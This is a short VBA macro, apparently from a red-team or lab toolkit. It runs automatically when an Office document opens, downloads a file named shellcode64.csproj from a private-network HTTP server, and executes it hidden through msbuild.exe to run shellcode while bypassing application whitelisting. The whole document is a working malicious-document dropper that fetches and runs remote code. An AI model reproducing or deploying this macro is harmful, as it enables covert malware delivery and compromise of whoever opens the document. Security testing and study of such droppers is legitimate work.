' based on
' https://stackoverflow.com/questions/17877389/how-do-i-download-a-file-using-vba-without-internet-explorer
'
' powashell.csproj by @SubTee
' https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0

Sub Document_Open()
Dim WinHttpReq As Object
Dim oStream As Object
Dim myURL As String
Dim LocalFilePath As String

myURL = "http://192.168.50.145/shellcode64.csproj"
LocalFilePath = "C:\Users\Public\Downloads\shellcode64.csproj"

Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", myURL, False, "", ""  '("username", "password")
WinHttpReq.send

If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.responseBody
    oStream.SaveToFile LocalFilePath, 2 ' 1 = no overwrite, 2 = overwrite
    oStream.Close
End If

Dim ExecFile As Double
    ExecFile = Shell("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Users\Public\Downloads\shellcode64.csproj", vbHide)
    
End Sub
